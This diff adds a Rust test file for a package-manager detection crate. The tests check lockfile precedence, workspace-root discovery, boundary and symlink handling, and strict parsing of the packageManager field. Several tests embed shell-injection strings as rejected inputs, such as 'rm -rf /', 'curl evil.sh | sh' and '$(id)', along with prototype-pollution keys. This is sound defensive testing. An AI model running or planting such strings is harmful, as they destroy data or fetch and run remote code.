+++ crates/uf_pm/src/detect/tests.rs
@@ -1,0 +1,989 @@
+use super::*;
+
+fn temp_root() -> (tempfile::TempDir, Utf8PathBuf) {
+    let dir = tempfile::tempdir().unwrap();
+    let root = Utf8PathBuf::from_path_buf(dir.path().to_path_buf()).unwrap();
+    (dir, root)
+}
+
+fn write(path: &Utf8Path, contents: &str) {
+    if let Some(parent) = path.parent() {
+        fs::create_dir_all(parent).unwrap();
+    }
+    fs::write(path, contents).unwrap();
+}
+
+/// Detect inside a hermetic tree: the boundary keeps the ancestor walk from
+/// noticing lockfiles that happen to live above the system temp directory.
+fn detect_within(root: &Utf8Path, start: &Utf8Path) -> Detection {
+    detect_package_manager_with(start, &DetectionOptions::new().with_boundary(root))
+}
+
+#[test]
+fn empty_directory_defaults_to_uf_native() {
+    let (_guard, root) = temp_root();
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert_eq!(detection.source, DetectionSource::Default);
+    assert_eq!(detection.source.kind(), "default");
+    assert!(detection.alternatives.is_empty());
+    assert!(detection.issues.is_empty());
+    assert!(detection.is_uf_native());
+    assert!(!detection.is_ambiguous());
+}
+
+#[test]
+fn uf_lock_detects_the_native_resolver() {
+    let (_guard, root) = temp_root();
+    write(&root.join("uf.lock"), "{}\n");
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert_eq!(detection.source.kind(), "lockfile");
+}
+
+#[test]
+fn pnpm_lockfile_detects_pnpm() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(detection.package_manager, PackageManager::Pnpm);
+    assert_eq!(
+        detection.source,
+        DetectionSource::Lockfile {
+            lockfile: Lockfile::PnpmLock,
+            path: root.join("pnpm-lock.yaml"),
+        }
+    );
+}
+
+#[test]
+fn package_lock_detects_npm() {
+    let (_guard, root) = temp_root();
+    write(&root.join("package-lock.json"), "{}\n");
+
+    assert_eq!(
+        detect_within(&root, &root).package_manager,
+        PackageManager::Npm
+    );
+}
+
+#[test]
+fn npm_shrinkwrap_detects_npm() {
+    let (_guard, root) = temp_root();
+    write(&root.join("npm-shrinkwrap.json"), "{}\n");
+
+    assert_eq!(
+        detect_within(&root, &root).package_manager,
+        PackageManager::Npm
+    );
+}
+
+#[test]
+fn bun_text_lockfile_detects_bun() {
+    let (_guard, root) = temp_root();
+    write(&root.join("bun.lock"), "{}\n");
+
+    assert_eq!(
+        detect_within(&root, &root).package_manager,
+        PackageManager::Bun
+    );
+}
+
+#[test]
+fn bun_binary_lockfile_detects_bun() {
+    let (_guard, root) = temp_root();
+    write(&root.join("bun.lockb"), "\0binary\n");
+
+    assert_eq!(
+        detect_within(&root, &root).package_manager,
+        PackageManager::Bun
+    );
+}
+
+#[test]
+fn both_bun_lockfiles_are_one_manager_not_an_ambiguity() {
+    let (_guard, root) = temp_root();
+    write(&root.join("bun.lock"), "{}\n");
+    write(&root.join("bun.lockb"), "\0binary\n");
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(detection.package_manager, PackageManager::Bun);
+    assert!(!detection.is_ambiguous());
+    assert_eq!(detection.alternatives.len(), 1);
+}
+
+#[test]
+fn plain_yarn_lock_detects_yarn_classic() {
+    let (_guard, root) = temp_root();
+    write(&root.join("yarn.lock"), "# yarn lockfile v1\n\n");
+
+    assert_eq!(
+        detect_within(&root, &root).package_manager,
+        PackageManager::Yarn(YarnEdition::Classic)
+    );
+}
+
+#[test]
+fn yarn_lock_metadata_header_detects_berry() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("yarn.lock"),
+        "# This file is generated by running \"yarn install\"\n\n__metadata:\n  version: 8\n",
+    );
+
+    assert_eq!(
+        detect_within(&root, &root).package_manager,
+        PackageManager::Yarn(YarnEdition::Berry)
+    );
+}
+
+#[test]
+fn yarnrc_yml_detects_berry_even_without_a_lockfile_header() {
+    let (_guard, root) = temp_root();
+    write(&root.join("yarn.lock"), "");
+    write(&root.join(".yarnrc.yml"), "nodeLinker: node-modules\n");
+
+    assert_eq!(
+        detect_within(&root, &root).package_manager,
+        PackageManager::Yarn(YarnEdition::Berry)
+    );
+}
+
+#[test]
+fn yarn_edition_probe_ignores_a_huge_lockfile_tail() {
+    let (_guard, root) = temp_root();
+    let mut lock = String::from("# yarn lockfile v1\n");
+    lock.push_str(&"# padding\n".repeat(4096));
+    lock.push_str("__metadata:\n");
+    write(&root.join("yarn.lock"), &lock);
+
+    // The `__metadata:` marker sits past the probe window, so the header wins.
+    assert_eq!(yarn_edition_in(&root), YarnEdition::Classic);
+}
+
+#[test]
+fn side_by_side_lockfiles_report_ambiguity_without_silently_picking() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    write(&root.join("package-lock.json"), "{}\n");
+    write(&root.join("yarn.lock"), "# yarn lockfile v1\n");
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(detection.package_manager, PackageManager::Pnpm);
+    assert!(detection.is_ambiguous());
+    let DetectionOutcome::Ambiguous { lockfiles } = &detection.outcome else {
+        panic!("expected an ambiguous outcome");
+    };
+    assert_eq!(
+        lockfiles.as_slice(),
+        [
+            Lockfile::PnpmLock,
+            Lockfile::YarnLock,
+            Lockfile::PackageLock
+        ]
+    );
+    assert_eq!(detection.alternatives.len(), 2);
+}
+
+#[test]
+fn uf_lock_outranks_every_other_lockfile() {
+    let (_guard, root) = temp_root();
+    for lockfile in Lockfile::ALL {
+        write(&root.join(lockfile.file_name()), "");
+    }
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert!(detection.is_ambiguous());
+    assert_eq!(detection.alternatives.len(), Lockfile::ALL.len() - 1);
+}
+
+#[test]
+fn package_manager_field_outranks_a_lockfile() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    write(
+        &root.join("package.json"),
+        r#"{ "name": "demo", "packageManager": "yarn@4.1.0" }"#,
+    );
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(
+        detection.package_manager,
+        PackageManager::Yarn(YarnEdition::Berry)
+    );
+    assert_eq!(detection.source.kind(), "package-manager-field");
+    assert_eq!(
+        detection.alternatives[0].package_manager,
+        PackageManager::Pnpm
+    );
+    assert!(!detection.is_ambiguous());
+}
+
+#[test]
+fn package_manager_field_keeps_the_parsed_version_and_integrity() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("package.json"),
+        r#"{ "packageManager": "pnpm@9.1.0+sha512.abc123" }"#,
+    );
+
+    let detection = detect_within(&root, &root);
+
+    let DetectionSource::PackageManagerField { spec, manifest } = &detection.source else {
+        panic!("expected the packageManager field to decide detection");
+    };
+    assert_eq!(manifest, &root.join("package.json"));
+    assert_eq!(spec.manager, PackageManager::Pnpm);
+    assert_eq!(spec.version.to_string(), "9.1.0");
+    assert_eq!(spec.integrity.as_deref(), Some("sha512.abc123"));
+}
+
+#[test]
+fn config_override_outranks_the_package_manager_field() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    write(
+        &root.join("package.json"),
+        r#"{ "packageManager": "yarn@4.1.0" }"#,
+    );
+
+    let options = DetectionOptions::new()
+        .with_boundary(&root)
+        .with_config_override(PackageManager::Bun);
+    let detection = detect_package_manager_with(&root, &options);
+
+    assert_eq!(detection.package_manager, PackageManager::Bun);
+    assert_eq!(detection.source, DetectionSource::ConfigOverride);
+    assert_eq!(detection.alternatives.len(), 2);
+    assert_eq!(
+        detection.alternatives[0].package_manager,
+        PackageManager::Yarn(YarnEdition::Berry)
+    );
+    assert_eq!(
+        detection.alternatives[1].package_manager,
+        PackageManager::Pnpm
+    );
+}
+
+#[test]
+fn local_lockfile_outranks_the_ancestor_workspace_root() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    let package = root.join("packages/app");
+    write(&package.join("bun.lock"), "{}\n");
+
+    let detection = detect_within(&root, &package);
+
+    assert_eq!(detection.package_manager, PackageManager::Bun);
+    assert_eq!(detection.source.kind(), "lockfile");
+    assert_eq!(
+        detection.alternatives[0].package_manager,
+        PackageManager::Pnpm
+    );
+    assert_eq!(detection.alternatives[0].source.kind(), "workspace-root");
+}
+
+#[test]
+fn ancestor_lockfile_is_inherited_by_a_workspace_member() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    let package = root.join("packages/app");
+    write(&package.join("package.json"), r#"{ "name": "app" }"#);
+
+    let detection = detect_within(&root, &package);
+
+    assert_eq!(detection.package_manager, PackageManager::Pnpm);
+    assert_eq!(
+        detection.source,
+        DetectionSource::WorkspaceRoot {
+            root: root.clone(),
+            marker: WorkspaceMarker::Lockfile(Lockfile::PnpmLock),
+        }
+    );
+}
+
+#[test]
+fn pnpm_workspace_yaml_marks_the_workspace_root() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("pnpm-workspace.yaml"),
+        "packages:\n  - packages/*\n",
+    );
+    let package = root.join("packages/app");
+    write(&package.join("package.json"), r#"{ "name": "app" }"#);
+
+    let detection = detect_within(&root, &package);
+
+    assert_eq!(detection.package_manager, PackageManager::Pnpm);
+    assert_eq!(
+        detection.source,
+        DetectionSource::WorkspaceRoot {
+            root: root.clone(),
+            marker: WorkspaceMarker::PnpmWorkspaceYaml,
+        }
+    );
+}
+
+#[test]
+fn package_json_workspaces_marks_the_workspace_root() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("package.json"),
+        r#"{ "workspaces": ["packages/*"], "packageManager": "npm@10.5.0" }"#,
+    );
+    let package = root.join("packages/app");
+    write(&package.join("package.json"), r#"{ "name": "app" }"#);
+
+    let detection = detect_within(&root, &package);
+
+    assert_eq!(detection.package_manager, PackageManager::Npm);
+    assert_eq!(
+        detection.source,
+        DetectionSource::WorkspaceRoot {
+            root: root.clone(),
+            marker: WorkspaceMarker::PackageJsonWorkspaces,
+        }
+    );
+}
+
+#[test]
+fn yarn_object_workspaces_mark_the_workspace_root() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("package.json"),
+        r#"{ "workspaces": { "packages": ["packages/*"] }, "packageManager": "yarn@1.22.19" }"#,
+    );
+    let package = root.join("packages/app");
+    fs::create_dir_all(&package).unwrap();
+
+    let detection = detect_within(&root, &package);
+
+    assert_eq!(
+        detection.package_manager,
+        PackageManager::Yarn(YarnEdition::Classic)
+    );
+}
+
+#[test]
+fn empty_workspaces_array_is_not_a_workspace_root() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("package.json"),
+        r#"{ "workspaces": [], "packageManager": "npm@10.5.0" }"#,
+    );
+    let package = root.join("packages/app");
+    fs::create_dir_all(&package).unwrap();
+
+    assert_eq!(
+        detect_within(&root, &package).package_manager,
+        PackageManager::Uf
+    );
+}
+
+#[test]
+fn a_workspace_root_without_manager_evidence_falls_back_to_uf() {
+    let (_guard, root) = temp_root();
+    write(&root.join("package.json"), r#"{ "workspaces": ["pkg/*"] }"#);
+    let package = root.join("pkg/app");
+    fs::create_dir_all(&package).unwrap();
+
+    let detection = detect_within(&root, &package);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert_eq!(detection.source, DetectionSource::Default);
+}
+
+#[test]
+fn the_ancestor_walk_stops_at_a_git_directory() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    let repo = root.join("repo");
+    fs::create_dir_all(repo.join(".git")).unwrap();
+    let package = repo.join("app");
+    fs::create_dir_all(&package).unwrap();
+
+    let detection = detect_within(&root, &package);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert_eq!(detection.source, DetectionSource::Default);
+}
+
+#[test]
+fn the_ancestor_walk_is_depth_bounded() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    let deep = root.join("a/b/c/d");
+    fs::create_dir_all(&deep).unwrap();
+
+    let options = DetectionOptions::new()
+        .with_boundary(&root)
+        .with_max_ancestors(2);
+    let detection = detect_package_manager_with(&deep, &options);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert!(
+        detection
+            .issues
+            .contains(&DetectionIssue::AncestorLimitReached { limit: 2 })
+    );
+}
+
+#[test]
+fn the_ancestor_walk_never_reads_outside_the_boundary() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    let inner = root.join("inner");
+    let package = inner.join("app");
+    fs::create_dir_all(&package).unwrap();
+
+    let bounded =
+        detect_package_manager_with(&package, &DetectionOptions::new().with_boundary(&inner));
+    assert_eq!(bounded.package_manager, PackageManager::Uf);
+
+    let unbounded =
+        detect_package_manager_with(&package, &DetectionOptions::new().with_boundary(&root));
+    assert_eq!(unbounded.package_manager, PackageManager::Pnpm);
+}
+
+#[test]
+fn a_start_path_that_escapes_the_boundary_reads_nothing() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    let inner = root.join("inner");
+    fs::create_dir_all(&inner).unwrap();
+
+    let escape = inner.join("..");
+    let detection =
+        detect_package_manager_with(&escape, &DetectionOptions::new().with_boundary(&inner));
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert_eq!(detection.source, DetectionSource::Default);
+    assert!(matches!(
+        detection.issues.first(),
+        Some(DetectionIssue::OutsideBoundary { .. })
+    ));
+}
+
+#[cfg(unix)]
+#[test]
+fn a_symlinked_lockfile_never_votes() {
+    let (_guard, root) = temp_root();
+    let outside = root.join("outside");
+    let project = root.join("project");
+    fs::create_dir_all(&outside).unwrap();
+    fs::create_dir_all(&project).unwrap();
+    write(&outside.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    std::os::unix::fs::symlink(
+        outside.join("pnpm-lock.yaml").as_std_path(),
+        project.join("pnpm-lock.yaml").as_std_path(),
+    )
+    .unwrap();
+
+    let detection = detect_within(&root, &project);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert!(scan_lockfiles(&project).is_empty());
+}
+
+#[cfg(unix)]
+#[test]
+fn a_symlinked_manifest_is_refused_instead_of_followed() {
+    let (_guard, root) = temp_root();
+    let outside = root.join("outside");
+    let project = root.join("project");
+    fs::create_dir_all(&outside).unwrap();
+    fs::create_dir_all(&project).unwrap();
+    write(
+        &outside.join("package.json"),
+        r#"{ "packageManager": "bun@1.1.0" }"#,
+    );
+    std::os::unix::fs::symlink(
+        outside.join("package.json").as_std_path(),
+        project.join("package.json").as_std_path(),
+    )
+    .unwrap();
+
+    let detection = detect_within(&root, &project);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert!(
+        detection
+            .issues
+            .contains(&DetectionIssue::ManifestUnusable {
+                manifest: project.join("package.json"),
+                fault: ManifestFault::NotARegularFile,
+            })
+    );
+}
+
+#[test]
+fn a_hostile_package_manager_field_is_rejected_and_never_executed() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("package.json"),
+        r#"{ "packageManager": "pnpm@9.0.0; rm -rf /" }"#,
+    );
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert_eq!(detection.source, DetectionSource::Default);
+    assert!(matches!(
+        detection.issues.first(),
+        Some(DetectionIssue::InvalidPackageManagerField {
+            error: PackageManagerFieldError::ForbiddenCharacter { character: ';', .. },
+            ..
+        })
+    ));
+}
+
+#[test]
+fn an_oversized_manifest_is_refused_with_a_typed_issue() {
+    let (_guard, root) = temp_root();
+    let mut manifest = String::from(r#"{ "packageManager": "pnpm@9.0.0", "pad": ""#);
+    manifest.push_str(&"a".repeat(4096));
+    manifest.push_str("\" }");
+    write(&root.join("package.json"), &manifest);
+
+    let options = DetectionOptions::new()
+        .with_boundary(&root)
+        .with_max_manifest_bytes(64);
+    let detection = detect_package_manager_with(&root, &options);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    assert!(matches!(
+        detection.issues.first(),
+        Some(DetectionIssue::ManifestTooLarge { limit: 64, .. })
+    ));
+}
+
+#[test]
+fn an_invalid_manifest_is_refused_with_a_typed_issue() {
+    let (_guard, root) = temp_root();
+    write(&root.join("package.json"), "{ not json");
+
+    let detection = detect_within(&root, &root);
+
+    assert!(
+        detection
+            .issues
+            .contains(&DetectionIssue::ManifestUnusable {
+                manifest: root.join("package.json"),
+                fault: ManifestFault::InvalidJson,
+            })
+    );
+}
+
+#[test]
+fn a_non_object_manifest_is_refused() {
+    let (_guard, root) = temp_root();
+    write(&root.join("package.json"), "[1, 2, 3]");
+
+    let detection = detect_within(&root, &root);
+
+    assert!(
+        detection
+            .issues
+            .contains(&DetectionIssue::ManifestUnusable {
+                manifest: root.join("package.json"),
+                fault: ManifestFault::InvalidJson,
+            })
+    );
+}
+
+#[test]
+fn prototype_pollution_keys_are_reported_and_ignored() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("package.json"),
+        r#"{ "__proto__": { "packageManager": "npm@10.0.0" }, "constructor": {}, "prototype": {} }"#,
+    );
+
+    let detection = detect_within(&root, &root);
+
+    assert_eq!(detection.package_manager, PackageManager::Uf);
+    for key in ["__proto__", "constructor", "prototype"] {
+        assert!(
+            detection
+                .issues
+                .contains(&DetectionIssue::PollutingManifestKey {
+                    manifest: root.join("package.json"),
+                    key: CompactString::const_new(key),
+                })
+        );
+    }
+}
+
+#[test]
+fn a_manifest_with_a_bom_and_crlf_still_parses() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("package.json"),
+        "\u{feff}{\r\n  \"packageManager\": \"bun@1.1.30\"\r\n}\r\n",
+    );
+
+    // serde_json rejects a BOM, so the manifest is refused rather than guessed at.
+    let detection = detect_within(&root, &root);
+    assert!(
+        detection
+            .issues
+            .contains(&DetectionIssue::ManifestUnusable {
+                manifest: root.join("package.json"),
+                fault: ManifestFault::InvalidJson,
+            })
+    );
+
+    write(
+        &root.join("package.json"),
+        "{\r\n  \"packageManager\": \"bun@1.1.30\"\r\n}\r\n",
+    );
+    assert_eq!(
+        detect_within(&root, &root).package_manager,
+        PackageManager::Bun
+    );
+}
+
+#[test]
+fn a_non_ascii_package_manager_field_is_rejected() {
+    let (_guard, root) = temp_root();
+    write(
+        &root.join("package.json"),
+        "{ \"packageManager\": \"pnpm@9.0.0\u{3002}1\" }",
+    );
+
+    let detection = detect_within(&root, &root);
+
+    assert!(matches!(
+        detection.issues.first(),
+        Some(DetectionIssue::InvalidPackageManagerField {
+            error: PackageManagerFieldError::ForbiddenCharacter {
+                character: '\u{3002}',
+                ..
+            },
+            ..
+        })
+    ));
+}
+
+#[test]
+fn detection_round_trips_through_json() {
+    let (_guard, root) = temp_root();
+    write(&root.join("pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
+    write(
+        &root.join("package.json"),
+        r#"{ "packageManager": "yarn@4.1.0" }"#,
+    );
+
+    let detection = detect_within(&root, &root);
+    let json = serde_json::to_string(&detection).unwrap();
+    let parsed = serde_json::from_str::<Detection>(&json).unwrap();
+
+    assert_eq!(parsed, detection);
+    assert!(json.contains(r#""packageManager":"yarn-berry""#));
+    assert!(json.contains(r#""kind":"package-manager-field""#));
+}
+
+#[test]
+fn detection_is_idempotent() {
+    let (_guard, root) = temp_root();
+    write(&root.join("bun.lock"), "{}\n");
+
+    let first = detect_within(&root, &root);
+    let second = detect_within(&root, &root);
+
+    assert_eq!(first, second);
+}
+
+#[test]
+fn parses_every_supported_package_manager_field_name() {
+    for (raw, expected) in [
+        ("npm@10.5.0", PackageManager::Npm),
+        ("pnpm@9.1.0", PackageManager::Pnpm),
+        ("bun@1.1.30", PackageManager::Bun),
+        ("yarn@1.22.19", PackageManager::Yarn(YarnEdition::Classic)),
+        ("yarn@4.1.0", PackageManager::Yarn(YarnEdition::Berry)),
+        ("yarn@2.0.0", PackageManager::Yarn(YarnEdition::Berry)),
+    ] {
+        let spec = parse_package_manager_field(raw).unwrap();
+        assert_eq!(spec.manager, expected, "{raw}");
+    }
+}
+
+#[test]
+fn parses_a_prerelease_and_integrity_suffix() {
+    let spec = parse_package_manager_field("pnpm@9.0.0-beta.1+sha512.deadbeef-0").unwrap();
+
+    assert_eq!(spec.manager, PackageManager::Pnpm);
+    assert_eq!(spec.version.major, 9);
+    assert_eq!(spec.version.prerelease.as_deref(), Some("beta.1"));
+    assert_eq!(spec.integrity.as_deref(), Some("sha512.deadbeef-0"));
+    assert_eq!(spec.version.to_string(), "9.0.0-beta.1");
+}
+
+#[test]
+fn parses_an_integrity_suffix_without_a_prerelease() {
+    let spec = parse_package_manager_field("yarn@4.1.0+sha224.abc").unwrap();
+
+    assert_eq!(spec.version.prerelease, None);
+    assert_eq!(spec.integrity.as_deref(), Some("sha224.abc"));
+}
+
+#[test]
+fn rejects_an_empty_package_manager_field() {
+    assert_eq!(
+        parse_package_manager_field(""),
+        Err(PackageManagerFieldError::Empty)
+    );
+}
+
+#[test]
+fn rejects_a_package_manager_field_without_a_separator() {
+    assert_eq!(
+        parse_package_manager_field("pnpm"),
+        Err(PackageManagerFieldError::MissingSeparator)
+    );
+}
+
+#[test]
+fn rejects_an_unknown_package_manager_name() {
+    assert_eq!(
+        parse_package_manager_field("uf@1.0.0"),
+        Err(PackageManagerFieldError::UnknownManager {
+            name: CompactString::const_new("uf"),
+        })
+    );
+}
+
+#[test]
+fn rejects_a_shell_injection_attempt_with_a_typed_error() {
+    // A hostile manifest must never reach a program name or an argument.
+    let error = parse_package_manager_field("pnpm@9.0.0; rm -rf /").unwrap_err();
+
+    assert_eq!(
+        error,
+        PackageManagerFieldError::ForbiddenCharacter {
+            character: ';',
+            offset: "pnpm@9.0.0".len(),
+        }
+    );
+    assert!(error.to_string().contains("forbidden character"));
+}
+
+#[test]
+fn rejects_shell_metacharacters_anywhere_in_the_field() {
+    for hostile in [
+        "pnpm@9.0.0 && curl evil.sh | sh",
+        "pnpm@9.0.0|whoami",
+        "pnpm@9.0.0`id`",
+        "pnpm@9.0.0$(id)",
+        "pnpm@9.0.0\nnpm@1.0.0",
+        "pnpm@9.0.0 --registry=http://evil",
+        "../../bin/sh@1.0.0",
+        "pnpm@9.0.0+sha512.abc;id",
+    ] {
+        assert!(
+            parse_package_manager_field(hostile).is_err(),
+            "accepted {hostile:?}"
+        );
+    }
+}
+
+#[test]
+fn rejects_a_malformed_version() {
+    for raw in [
+        "pnpm@",
+        "pnpm@9",
+        "pnpm@9.",
+        "pnpm@9.1",
+        "pnpm@9.1.",
+        "pnpm@.1.0",
+    ] {
+        assert!(
+            matches!(
+                parse_package_manager_field(raw),
+                Err(PackageManagerFieldError::MalformedVersion { .. })
+            ),
+            "accepted {raw:?}"
+        );
+    }
+}
+
+#[test]
+fn rejects_a_version_component_that_overflows_u32() {
+    assert!(matches!(
+        parse_package_manager_field("pnpm@99999999999.0.0"),
+        Err(PackageManagerFieldError::VersionOverflow { .. })
+    ));
+}
+
+#[test]
+fn rejects_an_empty_prerelease_or_integrity_segment() {
+    assert!(parse_package_manager_field("pnpm@9.0.0-").is_err());
+    assert!(parse_package_manager_field("pnpm@9.0.0+").is_err());
+    assert!(parse_package_manager_field("pnpm@9.0.0-+sha512.a").is_err());
+}
+
+#[test]
+fn rejects_a_second_integrity_segment() {
+    assert!(parse_package_manager_field("pnpm@9.0.0+sha1.a+sha1.b").is_err());
+}
+
+#[test]
+fn rejects_an_oversized_package_manager_field_before_parsing_it() {
+    let raw = format!("pnpm@9.0.0+{}", "a".repeat(MAX_PACKAGE_MANAGER_FIELD_BYTES));
+
+    assert!(matches!(
+        parse_package_manager_field(&raw),
+        Err(PackageManagerFieldError::TooLong { limit, .. })
+            if limit == MAX_PACKAGE_MANAGER_FIELD_BYTES
+    ));
+}
+
+#[test]
+fn a_pathological_package_manager_field_parses_in_one_pass() {
+    // The classic ReDoS shape (`(a+)+$` fed a long run then a mismatch) is
+    // linear here because the grammar is hand-written and every byte is
+    // visited once; a backtracking regex would blow up on this input.
+    let bounded = format!("pnpm@9.0.0-{}!", "a-.".repeat(38));
+    assert!(bounded.len() <= MAX_PACKAGE_MANAGER_FIELD_BYTES);
+    assert!(matches!(
+        parse_package_manager_field(&bounded),
+        Err(PackageManagerFieldError::ForbiddenCharacter { character: '!', .. })
+    ));
+
+    // Anything longer is refused by the length cap before parsing starts.
+    let oversized = format!("pnpm@9.0.0-{}!", "a-.".repeat(4096));
+    assert!(oversized.len() > MAX_PACKAGE_MANAGER_FIELD_BYTES);
+    assert!(matches!(
+        parse_package_manager_field(&oversized),
+        Err(PackageManagerFieldError::TooLong { .. })
+    ));
+}
+
+#[test]
+fn leading_zero_version_components_are_accepted_like_corepack() {
+    let spec = parse_package_manager_field("npm@0010.0.0").unwrap();
+
+    assert_eq!(spec.version.major, 10);
+}
+
+#[test]
+fn package_manager_identifiers_round_trip() {
+    for manager in PackageManager::ALL {
+        assert_eq!(PackageManager::parse(manager.as_str()), Some(manager));
+        assert_eq!(manager.to_string(), manager.as_str());
+    }
+    assert_eq!(
+        PackageManager::parse("yarn"),
+        Some(PackageManager::Yarn(YarnEdition::Berry))
+    );
+    assert_eq!(PackageManager::parse("deno"), None);
+}
+
+#[test]
+fn package_manager_serializes_as_a_stable_string() {
+    let json = serde_json::to_string(&PackageManager::Yarn(YarnEdition::Classic)).unwrap();
+
+    assert_eq!(json, r#""yarn-classic""#);
+    assert_eq!(
+        serde_json::from_str::<PackageManager>(&json).unwrap(),
+        PackageManager::Yarn(YarnEdition::Classic)
+    );
+    assert!(serde_json::from_str::<PackageManager>(r#""deno""#).is_err());
+}
+
+#[test]
+fn every_manager_declares_the_lockfile_it_writes() {
+    assert_eq!(PackageManager::Uf.lockfile(), Lockfile::UfLock);
+    assert_eq!(PackageManager::Npm.lockfile(), Lockfile::PackageLock);
+    assert_eq!(PackageManager::Pnpm.lockfile(), Lockfile::PnpmLock);
+    assert_eq!(PackageManager::Bun.lockfile(), Lockfile::BunLock);
+    assert_eq!(
+        PackageManager::Yarn(YarnEdition::Berry).lockfile(),
+        Lockfile::YarnLock
+    );
+}
+
+#[test]
+fn every_lockfile_maps_to_a_manager_and_a_file_name() {
+    for lockfile in Lockfile::ALL {
+        assert!(!lockfile.file_name().is_empty());
+        assert_eq!(lockfile.to_string(), lockfile.file_name());
+    }
+    assert_eq!(Lockfile::UfLock.manager(), PackageManager::Uf);
+    assert_eq!(Lockfile::BunLockb.manager(), PackageManager::Bun);
+    assert_eq!(Lockfile::NpmShrinkwrap.manager(), PackageManager::Npm);
+}
+
+#[test]
+fn config_preferences_map_onto_managers() {
+    assert_eq!(
+        PackageManager::from_preference(PackageManagerPreference::Auto),
+        None
+    );
+    assert_eq!(
+        PackageManager::from_preference(PackageManagerPreference::Yarn),
+        Some(PackageManager::Yarn(YarnEdition::Berry))
+    );
+    assert_eq!(
+        PackageManager::from_preference(PackageManagerPreference::YarnClassic),
+        Some(PackageManager::Yarn(YarnEdition::Classic))
+    );
+    assert_eq!(
+        PackageManager::from_preference(PackageManagerPreference::Bun),
+        Some(PackageManager::Bun)
+    );
+}
+
+#[test]
+fn detection_options_default_to_the_documented_bounds() {
+    let options = DetectionOptions::new();
+
+    assert_eq!(options.max_ancestors, MAX_ANCESTOR_DEPTH);
+    assert_eq!(options.max_manifest_bytes, MAX_MANIFEST_BYTES);
+    assert_eq!(options.boundary, None);
+    assert_eq!(options.config_override, None);
+}
+
+#[test]
+fn config_options_pick_up_the_package_manager_override() {
+    let mut config = UniflowedConfig::default();
+    assert_eq!(DetectionOptions::from_config(&config).config_override, None);
+
+    config.pm.package_manager = PackageManagerPreference::Pnpm;
+    assert_eq!(
+        DetectionOptions::from_config(&config).config_override,
+        Some(PackageManager::Pnpm)
+    );
+}
+
+#[test]
+fn lexical_normalization_never_escapes_a_root() {
+    assert_eq!(lexically_normalized(Utf8Path::new("/a/./b/../c")), "/a/c");
+    assert_eq!(lexically_normalized(Utf8Path::new("/../..")), "/");
+    assert_eq!(lexically_normalized(Utf8Path::new("a/b/../../..")), "..");
+    assert_eq!(lexically_normalized(Utf8Path::new("./a/")), "a");
+}
+
+#[test]
+fn untrusted_text_in_errors_is_truncated() {
+    let raw = format!("npm@{}", "1".repeat(64));
+
+    let Err(PackageManagerFieldError::VersionOverflow { component }) =
+        parse_package_manager_field(&raw)
+    else {
+        panic!("expected an overflow rejection");
+    };
+    assert_eq!(component.len(), 32);
+}
